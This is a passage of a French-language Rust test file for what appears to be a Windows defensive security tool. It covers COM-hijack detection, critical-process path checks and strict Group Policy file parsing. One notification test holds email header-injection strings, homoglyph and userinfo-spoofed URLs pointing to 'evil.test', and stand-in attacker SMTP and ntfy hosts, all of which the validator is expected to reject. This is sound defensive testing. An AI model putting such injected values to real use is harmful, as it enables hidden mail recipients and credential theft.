    assert!(tourner_journal(&d).is_none(), "pas de journal : rien à tourner");
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn chemins_des_pilotes() {
    let w = crate::natif::dossier_windows();
    assert_eq!(crate::hygiene::chemin_image(r"\SystemRoot\System32\drivers\x.sys").to_string_lossy().to_lowercase(), format!(r"{w}\System32\drivers\x.sys").to_lowercase());
    assert_eq!(crate::hygiene::chemin_image(r"\??\C:\Temp\y.sys").to_string_lossy(), r"C:\Temp\y.sys");
    assert_eq!(crate::hygiene::chemin_image(r"System32\drivers\z.sys").to_string_lossy().to_lowercase(), format!(r"{w}\System32\drivers\z.sys").to_lowercase());
}

#[test]
fn tache_com_cible_le_serveur_du_clsid() {
    // Tâche planifiée à gestionnaire COM (Wininet\CacheTask, présente sur tout Windows) : la cible est la DLL du
    // CLSID, pas le dossier System32\COM trouvé en cherchant « COM » (signataire vide, donc « NON SIGNÉ » à tort)
    let w = crate::natif::dossier_windows();
    let c = crate::persistance::cible("COM {0358B920-0AC7-461F-98F4-58E32CD89148}");
    assert_eq!(c.to_lowercase(), format!(r"{w}\system32\wininet.dll").to_lowercase());
    // CLSID inconnu : aucune cible (signataire « ? »), jamais un dossier
    assert_eq!(crate::persistance::cible("COM {00000000-0000-0000-0000-0000000000D4}"), "");
    // Un nom relatif ne se résout jamais en dossier (ici System32\COM)
    assert_ne!(crate::persistance::cible("COM").to_lowercase(), format!(r"{w}\system32\com").to_lowercase());
}

#[test]
fn tache_com_hors_windows_sans_serveur_signalee() {
    // Détournement COM : tâche hors \Microsoft\Windows\ dont le CLSID n'est pas enregistré pour la machine (HKCU,
    // non lu) ou dont le serveur manque. Ne doit jamais sortir sans remarque
    let tache = |nom: &str, cible: &str| crate::commun::EntreeDemarrage {
        categorie: "Tâche planifiée".into(), nom: nom.into(), commande: "COM {00000000-0000-0000-0000-0000000000D4}".into(),
        cible: cible.into(), signataire: "?".into(), ..Default::default()
    };
    let absent = format!(r"{}\d4t-absent-{}.dll", crate::natif::dossier_systeme(), std::process::id());
    for (nom, c) in [(r"\Mise a jour", ""), (r"\Microsoft\Office\Tache", ""), (r"\Mise a jour", absent.as_str())] {
        assert!(crate::persistance::evaluer(&tache(nom, c)).contains("serveur COM non enregistré"), "{nom} / {c}");
    }
    // Tâche livrée avec Windows au CLSID non enregistré : pas de bruit
    assert_eq!(crate::persistance::evaluer(&tache(r"\Microsoft\Windows\Wininet\X", "")), "");
    // ClassId sans accolades (accepté et gardé tel quel par Windows) : la remarque ne se contourne pas
    let mut sans = tache(r"\Mise a jour", "");
    sans.commande = "COM 00000000-0000-0000-0000-0000000000D4".into();
    assert!(crate::persistance::evaluer(&sans).contains("serveur COM non enregistré"));
    // et le relevé le ramène à la forme reconnue, résolue comme les autres
    let wininet = "0358B920-0AC7-461F-98F4-58E32CD89148";
    for id in [wininet.to_string(), format!("{{{wininet}}}"), format!("  {{{wininet}}} ")] {
        assert_eq!(crate::persistance::commande_com(&id), format!("COM {{{wininet}}}"), "{id}");
    }
    let w = crate::natif::dossier_windows();
    assert_eq!(crate::persistance::cible(&crate::persistance::commande_com(wininet)).to_lowercase(), format!(r"{w}\system32\wininet.dll").to_lowercase());
}

// ------------------------------------------------------------ décisions (un test par correctif des revues)

fn alerte(niveau: &str, destination: &str, raisons: &str, score: i32) -> crate::commun::Alerte {
    crate::commun::Alerte {
        niveau: niveau.into(), destination: destination.into(), raisons: raisons.into(), score,
        processus: "réseau local".into(), mitre: "T1557.003".into(), heure: "2026-10-22 10:00:00".into(), ..Default::default()
    }
}

/// Audit AUD5-01 : la protection des processus critiques se contentait du nom et d'un chemin qui COMMENÇAIT par le
/// dossier Windows : une copie de powershell.exe nommée explorer.exe dans C:\Windows\Tasks (où tout compte peut écrire)
/// échappait à la suspension d'un rançongiciel. Chemin exact maintenant.
#[test]
fn audit_processus_critiques_par_chemin_exact() {
    use crate::reponse::chemin_critique as critique;
    let w = r"C:\Windows";
    for c in [r"C:\Windows\System32\svchost.exe", r"C:\WINDOWS\system32\LSASS.EXE", r"C:\Windows\explorer.exe", r"C:\Windows\System32\csrss.exe"] {
        assert!(critique(c, w), "{c}");
    }
    for c in [r"C:\Windows\Tasks\explorer.exe", r"C:\Windows\Temp\svchost.exe", r"C:\Windows\System32\spool\drivers\color\svchost.exe",
              r"C:\WindowsX\explorer.exe", r"C:\Windows\System32\..\Tasks\svchost.exe", r"D:\Windows\explorer.exe", r"C:\Users\x\explorer.exe",
              r"C:\Windows\System32\notepad.exe", r"C:\Windows\SysWOW64\explorer.exe"] {
        assert!(!critique(c, w), "{c} : pas un processus critique");
    }
    assert!(critique(r"C:\Windows\explorer.exe", r"C:\Windows\"), "dossier Windows avec barre finale");
}

#[test]
fn b1_leurre_touche_par_rundll32_suspendu() {
    // rundll32 : binaire Windows, mais ni logiciel connu ni processus critique → suspendu
    assert!(crate::vol_donnees::suspendre_leurre(true, false, false));
    // processus critique (svchost partagé…) : jamais
    assert!(!crate::vol_donnees::suspendre_leurre(true, false, true));
    // sauvegarde connue et signée : jamais
    assert!(!crate::vol_donnees::suspendre_leurre(true, true, false));
    // réponse automatique désactivée : jamais
    assert!(!crate::vol_donnees::suspendre_leurre(false, false, false));
}

#[test]
fn b2_noms_des_leurres_dans_le_dossier_des_secrets() {
    assert!(crate::hygiene::FICHIER_NOMS.starts_with("secrets\\"));
    assert!(crate::hygiene::FICHIER_LEURRES.starts_with("secrets\\"));
}

#[test]
fn b3_vraie_alerte_visible_parmi_300_usurpations() {
    let mut lot: Vec<_> = (1..=300).map(|i| alerte("Critique", &format!("serveur DHCP 192.168.1.{i}"),
        "SERVEUR DHCP PIRATE probable", 12)).collect();
    let mut vraie = alerte("Critique", "passerelle 192.168.1.254", "USURPATION ARP probable", 12);
    vraie.mitre = "T1557.002".into();
    lot.insert(150, vraie);
    let t = crate::notifications::texte(&lot);
    assert!(t.contains("USURPATION ARP"), "l'alerte unique doit apparaître");
    assert!(t.contains("300 × serveur DHCP"), "les 300 usurpations doivent tenir sur une ligne : {t}");
    assert!(t.find("USURPATION ARP").unwrap() < t.find("300 ×").unwrap(), "l'alerte unique d'abord");
}

/// Audit AUD6-02 et AUD3-07 : un serveur SMTP changé sans nouveau mot de passe recevait l'ancien (le dialogue de
/// confirmation ne montrait pas le serveur) ; une fin de ligne dans l'expéditeur ou les destinataires ajoutait des
/// en-têtes au message
#[test]
fn audit_notifications_secret_jamais_envoye_a_un_autre_serveur() {
    use crate::commun::ConfigNotifications;
    use crate::notifications::{preparer, Secrets};
    let actuelle = ConfigNotifications { smtp_serveur: "smtp.exemple.test".into(), smtp_utilisateur: "alertes".into(), ..Default::default() };
    let actuels = Secrets { ntfy_url: "https://ntfy.exemple.test/a".into(), ..Default::default() };
    let essai = |nouvelle: &ConfigNotifications, s: Secrets| { let mut s = s; preparer(&actuelle, nouvelle, &actuels, &mut s).map(|_| s) };
    // Même serveur, même compte, sans nouveau mot de passe : l'ancien est gardé
    assert_eq!(essai(&actuelle, Secrets::default()).unwrap().smtp_mot_de_passe, "");
    // Serveur, port ou compte changé sans nouveau mot de passe : l'ancien est effacé
    for n in [
        ConfigNotifications { smtp_serveur: "smtp.attaquant.test".into(), ..actuelle.clone() },
        ConfigNotifications { smtp_port: 2525, ..actuelle.clone() },
        ConfigNotifications { smtp_utilisateur: "autre".into(), ..actuelle.clone() },
    ] {
        assert_eq!(essai(&n, Secrets::default()).unwrap().smtp_mot_de_passe, "-", "{}:{} {}", n.smtp_serveur, n.smtp_port, n.smtp_utilisateur);
    }
    // Sécurité SMTP changée (TLS vers « aucune ») sans nouveau mot de passe : effacé (il partirait en clair)
    assert_eq!(essai(&ConfigNotifications { smtp_securite: "aucune".into(), ..actuelle.clone() }, Secrets::default()).unwrap().smtp_mot_de_passe, "-");
    // Nouveau mot de passe fourni avec le nouveau serveur : gardé
    let n = ConfigNotifications { smtp_serveur: "smtp2.exemple.test".into(), ..actuelle.clone() };
    assert_eq!(essai(&n, Secrets { smtp_mot_de_passe: "nouveau".into(), ..Default::default() }).unwrap().smtp_mot_de_passe, "nouveau");
    // Adresse ntfy changée sans nouveau jeton : jeton effacé ; même adresse : gardé
    assert_eq!(essai(&actuelle, Secrets { ntfy_url: "https://ntfy.attaquant.test/b".into(), ..Default::default() }).unwrap().ntfy_jeton, "-");
    assert_eq!(essai(&actuelle, Secrets { ntfy_url: "https://ntfy.exemple.test/a".into(), ..Default::default() }).unwrap().ntfy_jeton, "");
    // Adresses ntfy et Teams : homoglyphes, espaces et caractères invisibles refusés ; adresse ordinaire acceptée
    for u in ["https://ntfy.\u{0455}h/sujet", "https://ntfy.sh/a b", "https://ntfy.sh/a\u{200B}", "https://ntfy.sh/a\r\nX: y"] {
        assert!(essai(&actuelle, Secrets { ntfy_url: u.into(), ..Default::default() }).is_err(), "{u:?}");
        assert!(essai(&actuelle, Secrets { teams_url: u.into(), ..Default::default() }).is_err(), "{u:?}");
    }
    assert!(essai(&actuelle, Secrets { ntfy_url: "https://ntfy.sh/mon-sujet".into(), ..Default::default() }).is_ok());
    // Forme de l'adresse : compte, barre oblique inverse, autre schéma refusés ; port accepté ; « - » efface
    for u in [r"https://ntfy.sh\@evil.test/sujet", "https://ntfy.sh@evil.test/sujet", "http://ntfy.sh/sujet", "https://:443/x", "https://ntfy.sh:44a/x", "ftp://x/y"] {
        assert!(essai(&actuelle, Secrets { ntfy_url: u.into(), ..Default::default() }).is_err(), "{u:?}");
        assert!(essai(&actuelle, Secrets { teams_url: u.into(), ..Default::default() }).is_err(), "{u:?}");
    }
    for u in ["https://ntfy.exemple.test:8443/a", "https://prod-01.westeurope.logic.azure.com/workflows/x?api-version=1", "-"] {
        assert!(essai(&actuelle, Secrets { teams_url: u.into(), ..Default::default() }).is_ok(), "{u:?}");
    }
    // Caractères de contrôle : refus (en-têtes ajoutés)
    for n in [
        ConfigNotifications { expediteur: "a@exemple.test\r\nBcc: x@attaquant.test".into(), ..actuelle.clone() },
        ConfigNotifications { destinataires: "b@exemple.test\nBcc: x@attaquant.test".into(), ..actuelle.clone() },
        ConfigNotifications { smtp_serveur: "smtp.exemple.test\0".into(), ..actuelle.clone() },
        ConfigNotifications { expediteur: "a@exemple.test\u{202E}tset.tnaquatta".into(), ..actuelle.clone() },
        ConfigNotifications { destinataires: "b@exemple\u{200B}.test".into(), ..actuelle.clone() },
    ] {
        assert!(essai(&n, Secrets::default()).is_err());
    }
}

/// Audit AUD3-06 : CEF n'échappait que les fins de ligne ; NUL, ESC et tabulations passaient vers le SIEM
#[test]
fn audit_cef_sans_caractere_de_controle() {
    let mut a = alerte("Alerte", "dest\u{1b}[31m\u{0}x", "raison\twith\u{7}bell", 5);
    a.processus = "p\u{0}r\u{1b}oc".into();
    let ligne = crate::export::cef(&a);
    assert!(!ligne.chars().any(char::is_control), "{ligne:?}");
}

#[test]
fn notifications_critiques_jamais_retenues() {
    let lot = vec![alerte("Critique", "a", "x", 10), alerte("Alerte", "b", "y", 5)];
    // plafond atteint : la critique part, l'autre est retenue
    let (envoi, retenues, compte) = crate::notifications::repartir(lot.clone(), 10, 10);
    assert_eq!((envoi.len(), retenues, compte), (1, 1, false));
    assert_eq!(envoi[0].niveau, "Critique");
    // sous le plafond : tout part et l'envoi compte
    let (envoi, retenues, compte) = crate::notifications::repartir(lot, 0, 10);
    assert_eq!((envoi.len(), retenues, compte), (2, 0, true));
}

#[test]
fn editeurs_compares_exactement() {
    use crate::vol_donnees::editeur_correspond;
    assert!(editeur_correspond("Brave Software, Inc.", &["Brave Software, Inc."]));
    assert!(editeur_correspond("BRAVE SOFTWARE INC", &["Brave Software, Inc."]), "casse et ponctuation ignorées");
    assert!(!editeur_correspond("Brave Heart SARL", &["Brave Software, Inc."]));
    assert!(!editeur_correspond("Box, Inc. Fake Ltd", &["Box, Inc."]));
    assert!(!editeur_correspond("", &["Google LLC"]));
}

#[test]
fn blocages_leves_a_expiration_ou_hors_liste() {
    use crate::commun::Blocage;
    let b = |cible: &str, raison: &str, expire: &str| Blocage { type_: "parefeu".into(), cible: cible.into(), raison: raison.into(), date: String::new(), expire: expire.into() };
    let l = vec![
        b("1.1.1.1", "blocage automatique : Spamhaus", "2026-10-29 10:00:00"),
        b("2.2.2.2", "blocage automatique : Spamhaus", "2026-10-21 10:00:00"),
        b("3.3.3.3", "blocage manuel", ""),
    ];
    let listee = |ip: &str| ip != "1.1.1.1";
    let r = crate::moniteur::blocages_a_lever(&l, "2026-10-22 10:00:00", true, listee);
    let cibles: Vec<&str> = r.iter().map(|x| x.1.as_str()).collect();
    assert_eq!(cibles, vec!["1.1.1.1", "2.2.2.2"], "hors liste et expiré levés, manuel conservé");
    // listes pas encore chargées : seule l'expiration compte (sinon tout serait débloqué au démarrage)
    let r = crate::moniteur::blocages_a_lever(&l, "2026-10-22 10:00:00", false, |_| false);
    assert_eq!(r.len(), 1);
}

#[test]
fn baseline_reglage_asr_partage_conserve() {
    use crate::baseline::{reglages_partages, REGLES};
    let asr: Vec<&crate::baseline::Regle> = REGLES.iter().filter(|r| r.id.starts_with("asr.")).collect();
    assert!(asr.len() >= 2);
    // on annule la première règle ASR : ExploitGuard_ASR_Rules doit rester, puisque la deuxième l'utilise
    let retires = vec![(r"SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\ASR".to_string(), "ExploitGuard_ASR_Rules".to_string())];
    let garder = reglages_partages(&retires, &asr[1..]);
    assert_eq!(garder.len(), 1);
    assert_eq!(garder[0].1, "ExploitGuard_ASR_Rules");
    // plus aucune règle ASR appliquée : rien à conserver
    assert!(reglages_partages(&retires, &[]).is_empty());
}

#[test]
fn baseline_b1_sauvegarde_en_echec_rien_n_est_modifie() {
    // Relecture de la baseline du 2026-11-20, B1 : la sauvegarde du retour arrière passe d'abord ; si elle échoue,
    // aucune autre étape (Registry.pol, audit.csv, gpt.ini, journaux, gpupdate) n'est appelée
    use crate::baseline::{executer_etapes, Etape};
    use std::cell::RefCell;
    let appels = RefCell::new(Vec::<&str>::new());
    {
        let mut etapes: Vec<Etape> = vec![
            ("sauvegarde du retour arrière", Box::new(|| { appels.borrow_mut().push("sauvegarde"); Err("disque plein".to_string()) })),
            ("Registry.pol", Box::new(|| { appels.borrow_mut().push("pol"); Ok(()) })),
            ("gpt.ini", Box::new(|| { appels.borrow_mut().push("gpt"); Ok(()) })),
        ];
        let e = executer_etapes(&mut etapes).unwrap_err();
        assert!(e.contains("rien n'a été modifié"), "{e}");
        assert!(e.contains("disque plein"), "{e}");
    }
    assert_eq!(*appels.borrow(), vec!["sauvegarde"], "aucune modification après l'échec de la sauvegarde");

    // Échec au milieu : le message dit ce qui est fait et ce qui ne l'est pas, et la suite n'est pas appelée
    let appels = RefCell::new(Vec::<&str>::new());
    {
        let mut etapes: Vec<Etape> = vec![
            ("sauvegarde du retour arrière", Box::new(|| { appels.borrow_mut().push("sauvegarde"); Ok(()) })),
            ("Registry.pol", Box::new(|| { appels.borrow_mut().push("pol"); Ok(()) })),
            ("audit.csv", Box::new(|| { appels.borrow_mut().push("audit"); Err("accès refusé".to_string()) })),
            ("gpt.ini", Box::new(|| { appels.borrow_mut().push("gpt"); Ok(()) })),
        ];
        let e = executer_etapes(&mut etapes).unwrap_err();
        assert!(e.contains("Fait : sauvegarde du retour arrière, Registry.pol."), "{e}");
        assert!(e.contains("Non fait : audit.csv, gpt.ini."), "{e}");
    }
    assert_eq!(*appels.borrow(), vec!["sauvegarde", "pol", "audit"]);

    // Tout réussit : toutes les étapes, dans l'ordre
    let appels = RefCell::new(Vec::<&str>::new());
    {
        let mut etapes: Vec<Etape> = vec![
            ("sauvegarde du retour arrière", Box::new(|| { appels.borrow_mut().push("sauvegarde"); Ok(()) })),
            ("Registry.pol", Box::new(|| { appels.borrow_mut().push("pol"); Ok(()) })),
        ];
        assert!(executer_etapes(&mut etapes).is_ok());
    }
    assert_eq!(*appels.borrow(), vec!["sauvegarde", "pol"]);
}

#[test]
fn baseline_b1_sauvegarde_ecrite_avant_toute_modification() {
    // Câblage : dans appliquer, la sauvegarde est la première étape et le journal n'est plus activé pendant le
    // relevé ; plus aucun « let _ = » sur l'écriture de la sauvegarde
    let src = include_str!("baseline.rs");
    let debut = src.find("pub fn appliquer(").unwrap();
    let corps = &src[debut..src[debut..].find("
pub fn ").map(|i| debut + i).unwrap_or(src.len())];
    let i_sauvegarde = corps.find("(\"sauvegarde du retour arrière\"").expect("étape de sauvegarde");
    let i_pol = corps.find("(\"Registry.pol\"").expect("étape Registry.pol");
    assert!(i_sauvegarde < i_pol, "la sauvegarde passe avant Registry.pol");
    let releve = &corps[..corps.find("let mut etapes").unwrap()];
    assert!(!releve.contains("activer_journal"), "aucun journal activé pendant le relevé");
    assert!(!src.contains("let _ = commun::ecrire(\"baseline-sauvegarde.json\""), "échec d'écriture de la sauvegarde jamais ignoré");
}

/// Dossier temporaire propre à un test de la GPO locale (jamais la vraie GPO du poste)
fn dossier_gpo_test(nom: &str) -> std::path::PathBuf {
    let d = std::env::temp_dir().join(format!("d4t-gpo-{nom}-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&d);
    std::fs::create_dir_all(&d).unwrap();
    d
}

fn pol_exemple() -> (Vec<crate::gpo::EntreePol>, Vec<u8>) {
    use crate::gpo::{serialiser_pol, EntreePol};
    // Une stratégie d'un autre outil (Windows Update) et une de deR4Tizer
    let e = vec![
        EntreePol::dword(r"Software\Policies\Microsoft\Windows\WindowsUpdate\AU", "NoAutoUpdate", 0),
        EntreePol::texte(r"Software\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\ASR\Rules", "d4f940ab-401b-4efc-aadc-ad5f3c50688a", "1"),
    ];
    let o = serialiser_pol(&e);
    (e, o)
}

#[test]
fn audit_a_2_2_registry_pol_decode_strict() {
    // Audit du 2026-11-23, A-2-2 : un Registry.pol tronqué, d'en-tête inconnu ou suivi d'octets en trop est une
    // erreur, jamais une liste partielle ou vide qui ferait effacer les stratégies d'autres outils à la réécriture
    use crate::gpo::{decoder_pol, serialiser_pol};
    let (e, o) = pol_exemple();
    assert_eq!(decoder_pol(&o), Ok(e.clone()), "relu à l'identique");
    assert_eq!(serialiser_pol(&decoder_pol(&o).unwrap()), o, "réécrit à l'identique");
    assert_eq!(decoder_pol(b""), Ok(Vec::new()), "fichier vide : rien");
    assert_eq!(decoder_pol(b"PReg\x01\0\0\0"), Ok(Vec::new()), "en-tête seul : rien");
    assert!(decoder_pol(b"XReg\x01\0\0\0").is_err(), "en-tête inconnu");
    assert!(decoder_pol(b"PReg\x02\0\0\0").is_err(), "version inconnue");
    assert!(decoder_pol(b"PRe").is_err(), "en-tête tronqué");
    // Tronqué n'importe où (sauf aux limites d'entrées, qui donnent un fichier valide plus court) : erreur
    let limite = serialiser_pol(&e[..1]).len();
    for n in 1..o.len() {
        if n == 8 || n == limite {
            continue;
        }
        assert!(decoder_pol(&o[..n]).is_err(), "tronqué à {n} octets : jamais partiel");
    }
    let mut trop = o.clone();
    trop.extend(b"x\0");
    assert!(decoder_pol(&trop).is_err(), "octets en trop après la dernière entrée");
    let mut separateur = o.clone();
    separateur[8 + 2 + (e[0].cle.encode_utf16().count() + 1) * 2] = b','; // « ; » après la clé remplacé
    assert!(decoder_pol(&separateur).is_err(), "séparateur vérifié");
    // Aucune panique sur des octets abîmés ; une lecture réussie se réécrit à l'identique
    crate::tests::torturer(&o, &mut |d| {
        // Fichier vide : rien à lire, réécrit avec son seul en-tête
        if let (Ok(l), false) = (decoder_pol(d), d.is_empty()) {
            assert_eq!(serialiser_pol(&l), d, "lecture réussie = fichier entier compris");
        }
    });
}

#[test]
fn audit_a_2_2_registry_pol_rien_ecrit_si_lecture_refusee() {
    // A-2-2 : lecture refusée (fichier tenu par un autre programme), tronquée ou d'en-tête inconnu : Err et fichier
    // inchangé ; absent : créé avec nos seules entrées ; valide avec une entrée étrangère : elle est conservée
    use crate::gpo::{decoder_pol, lire_pol_de, modifier_pol_de, EntreePol};
    use std::os::windows::fs::OpenOptionsExt;
    let d = dossier_gpo_test("pol");
    let f = d.join("Registry.pol");
    let notre = EntreePol::dword(r"Software\Policies\Microsoft\Windows\System", "EnableSmartScreen", 1);
    // Absent : vide, puis créé
    assert_eq!(lire_pol_de(&f), Ok(Vec::new()));
    assert_eq!(modifier_pol_de(&f, &[notre.clone()], &[]), Ok(Vec::new()));
    assert_eq!(decoder_pol(&std::fs::read(&f).unwrap()), Ok(vec![notre.clone()]));
    // Valide avec une entrée étrangère : conservée, la nôtre ajoutée
    let (e, o) = pol_exemple();
    std::fs::write(&f, &o).unwrap();
    modifier_pol_de(&f, &[notre.clone()], &[]).unwrap();
    let relu = decoder_pol(&std::fs::read(&f).unwrap()).unwrap();
    assert!(relu.contains(&e[0]) && relu.contains(&e[1]) && relu.contains(&notre), "{relu:?}");
    // Lecture refusée : fichier tenu sans partage
    std::fs::write(&f, &o).unwrap();
    {
        let _tenu = std::fs::OpenOptions::new().read(true).share_mode(0).open(&f).unwrap();
        let err = modifier_pol_de(&f, &[notre.clone()], &[]).unwrap_err();
        assert!(err.contains("illisible"), "{err}");
    }
    assert_eq!(std::fs::read(&f).unwrap(), o, "rien n'est écrit après une lecture refusée");
    // Tronqué, puis en-tête inconnu : Err, fichier inchangé
    for abime in [o[..o.len() - 3].to_vec(), [b"XReg".as_slice(), &o[4..]].concat()] {
        std::fs::write(&f, &abime).unwrap();
        assert!(modifier_pol_de(&f, &[notre.clone()], &[]).is_err());
        assert_eq!(std::fs::read(&f).unwrap(), abime, "fichier abîmé jamais réécrit");
    }
    // Un dossier à la place du fichier : erreur, pas « vide »
    let f2 = d.join("dossier.pol");
    std::fs::create_dir_all(&f2).unwrap();
    assert!(lire_pol_de(&f2).is_err());
    // Aucun fichier voisin laissé derrière
    let restes: Vec<_> = std::fs::read_dir(&d).unwrap().filter_map(|x| x.ok()).filter(|x| x.file_name().to_string_lossy().ends_with(".tmp")).collect();
    assert!(restes.is_empty(), "fichier voisin laissé");
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn audit_a_2_3_entree_pol_retiree_seulement_si_encore_posee() {
    // Audit du 2026-11-23, A-2-3 : une entrée de Registry.pol n'est retirée que si elle vaut encore la valeur posée ;
    // changée par un tiers (règle ASR passée de l'audit au blocage), elle est gardée et signalée
    use crate::gpo::{fusionner_pol, EntreePol};
    let cle = r"Software\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\ASR\Rules";
    let posee = EntreePol::texte(cle, "regle", "2");
    let etrangere = EntreePol::dword(r"Software\Policies\Microsoft\Windows\WindowsUpdate\AU", "NoAutoUpdate", 0);
    let (r, g) = fusionner_pol(vec![etrangere.clone(), posee.clone()], &[], &[posee.clone()]);
    assert_eq!((r, g), (vec![etrangere.clone()], vec![]), "encore posée : retirée, l'étrangère reste");
    let durcie = EntreePol::texte(cle, "REGLE", "1");
    let (r, g) = fusionner_pol(vec![etrangere.clone(), durcie.clone()], &[], &[posee.clone()]);
    assert_eq!(r, vec![etrangere.clone(), durcie.clone()], "changée par un tiers : gardée");
    assert_eq!(g, vec![durcie.clone()], "et signalée");
    // Un ajout remplace l'entrée de même clé et même nom
    let (r, _) = fusionner_pol(vec![durcie.clone()], &[posee.clone()], &[]);
    assert_eq!(r, vec![posee.clone()]);
}

#[test]
fn audit_a_2_2_audit_csv_lu_en_echec_ferme() {
    // A-2-2 : audit.csv est en UTF-8 ([MS-GPAC] 2.2) ; UTF-16, octets non UTF-8, en-tête inconnu ou valeur hors
    // 0..3 : erreur, jamais « vide » ; les lignes d'options d'audit et d'audit global sont gardées telles quelles
    use crate::gpo::{decoder_audit, lire_audit_de, serialiser_audit, AuditCsv};
    use std::os::windows::fs::OpenOptionsExt;
    let t = "Machine Name,Policy Target,Subcategory,Subcategory GUID,Inclusion Setting,Exclusion Setting,Setting Value\r\n\
             ,System,Audit Logon,{0cce9215-69ae-11d9-bed3-505054503030},Success and Failure,,3\r\n\
             ,System,Option:CrashOnAuditFail,,Disabled,,0\r\n\
             ,System,FileGlobalSacl,,\"S:(AU;SA;FA;;;WD)\",,\r\n";
    let a = decoder_audit(t.as_bytes()).unwrap();
    assert_eq!(a.lignes, vec![("{0CCE9215-69AE-11D9-BED3-505054503030}".to_string(), "Audit Logon".to_string(), 3)]);
    assert_eq!(a.autres, vec![",System,Option:CrashOnAuditFail,,Disabled,,0", ",System,FileGlobalSacl,,\"S:(AU;SA;FA;;;WD)\",,"]);
    assert_eq!(decoder_audit(serialiser_audit(&a).as_bytes()), Ok(a.clone()), "réécrit sans rien perdre");
    assert_eq!(decoder_audit(&[b"\xEF\xBB\xBF".as_slice(), t.as_bytes()].concat()), Ok(a.clone()), "marque UTF-8 admise");
    assert_eq!(decoder_audit(b""), Ok(AuditCsv::default()), "vide : rien");
    let utf16: Vec<u8> = [0xFFu8, 0xFE].into_iter().chain(t.encode_utf16().flat_map(|c| c.to_le_bytes())).collect();
    assert!(decoder_audit(&utf16).unwrap_err().contains("UTF-16"));
    assert!(decoder_audit(&[t.as_bytes(), b",System,\xE9v\xE9nement,,x,,0\r\n"].concat()).is_err(), "ANSI : erreur");
    assert!(decoder_audit(b"Nom,Valeur\r\n,System,x,{0CCE9215-69AE-11D9-BED3-505054503030},Success,,1\r\n").is_err(), "en-tête inconnu");
    assert!(decoder_audit(t.replace(",,3", ",,7").as_bytes()).is_err(), "valeur hors 0..3");
    // Prérelecture de #270 : sous-catégorie en double, ou d'une autre forme (gardée telle quelle, elle se
    // retrouverait en double avec celle écrite par deR4Tizer) : refus
    let ligne = ",System,Audit Logon,{0CCE9215-69AE-11D9-BED3-505054503030},Success,,1\r\n";
    assert!(decoder_audit(format!("{t}{ligne}").as_bytes()).unwrap_err().contains("double"), "en double");
    assert!(decoder_audit(format!("{t},System,Audit Logon,{{0CCE9215-69AE-11D9-BED3-505054503030}},Success,,1,x\r\n").as_bytes()).is_err(), "8 colonnes");
    assert!(decoder_audit(format!("{t},Autre,Audit Logon,{{0CCE9215-69AE-11D9-BED3-505054503030}},Success,,1\r\n").as_bytes()).is_err(), "autre cible");
    crate::tests::torturer(t.as_bytes(), &mut |d| { let _ = decoder_audit(d); });
    // Fichier tenu par un autre programme : erreur ; absent : vide
    let d = dossier_gpo_test("audit");
    let f = d.join("audit.csv");
    assert_eq!(lire_audit_de(&f), Ok(AuditCsv::default()));
    std::fs::write(&f, t).unwrap();
    {
        let _tenu = std::fs::OpenOptions::new().read(true).share_mode(0).open(&f).unwrap();
        assert!(lire_audit_de(&f).is_err());
    }
    assert_eq!(lire_audit_de(&f), Ok(a));
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn audit_a_2_2_gpt_ini_lu_en_echec_ferme() {
    // A-2-2 : gpt.ini illisible, pas en UTF-8 ou à version illisible : erreur, rien n'est écrit
    use crate::gpo::{marquer_gpt_de, maj_gpt};
    use std::os::windows::fs::OpenOptionsExt;
    let t = maj_gpt("[General]\r\ngPCUserExtensionNames=[{X}]\r\nVersion=65538\r\n", false).unwrap();
    assert!(t.contains("Version=65539") && t.contains("gPCUserExtensionNames=[{X}]"), "{t}");
    assert!(maj_gpt("[General]\r\nVersion=abc\r\n", false).is_err(), "version illisible");
    assert!(maj_gpt("", true).unwrap().contains("Version=1"), "absent : première version");
    crate::tests::torturer_texte("[General]\r\ngPCMachineExtensionNames=[{A}{B}]\r\nVersion=65538\r\n", &mut |g| { let _ = maj_gpt(g, true); });
    let d = dossier_gpo_test("gpt");
    let f = d.join("gpt.ini");
    std::fs::write(&f, b"[General]\r\ndisplayName=Strat\xE9gie\r\nVersion=3\r\n").unwrap();
    assert!(marquer_gpt_de(&f, false).is_err(), "encodage non prévu");
    assert_eq!(std::fs::read(&f).unwrap(), b"[General]\r\ndisplayName=Strat\xE9gie\r\nVersion=3\r\n");
    std::fs::write(&f, b"[General]\r\nVersion=3\r\n").unwrap();
    {
        let _tenu = std::fs::OpenOptions::new().read(true).share_mode(0).open(&f).unwrap();
        assert!(marquer_gpt_de(&f, false).is_err());
    }
    assert_eq!(std::fs::read(&f).unwrap(), b"[General]\r\nVersion=3\r\n", "rien n'est écrit");
    marquer_gpt_de(&f, false).unwrap();
    assert!(std::fs::read_to_string(&f).unwrap().contains("Version=4"));
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn audit_a_2_2_ecriture_d_un_bloc_sans_changer_les_droits() {
    // A-2-2 : remplacement d'un bloc seulement si les droits du fichier voisin sont ceux de l'original ; sinon (ou
    // droits illisibles), réécriture en place qui garde les droits
    use crate::gpo::{ecrire_d_un_bloc, mode_ecriture, ModeEcriture};
    use crate::natif::{lire_securite, Ace, Securite};
    let s = Securite { proprietaire: "S-1-5-32-544".into(), protege: false, aces: vec![Ace { autorise: true, masque: 0x1F01FF, sid: "S-1-5-18".into() }], ace_inconnue: false };
    assert_eq!(mode_ecriture(Some(&s), Some(&s.clone())), ModeEcriture::Remplacer);
    assert_eq!(mode_ecriture(None, Some(&s)), ModeEcriture::EnPlace, "droits de l'original illisibles");
    assert_eq!(mode_ecriture(Some(&s), None), ModeEcriture::EnPlace);
    let mut autre = s.clone();
    autre.aces.push(Ace { autorise: true, masque: 0x1200A9, sid: "S-1-5-11".into() });
    assert_eq!(mode_ecriture(Some(&autre), Some(&s)), ModeEcriture::EnPlace, "DACL différente");
    let mut protege = s.clone();
    protege.protege = true;
    assert_eq!(mode_ecriture(Some(&protege), Some(&s)), ModeEcriture::EnPlace, "héritage coupé sur l'original");
    let mut proprio = s.clone();
    proprio.proprietaire = "S-1-5-18".into();
    assert_eq!(mode_ecriture(Some(&proprio), Some(&s)), ModeEcriture::EnPlace, "propriétaire différent");
    let mut inconnue = s.clone();
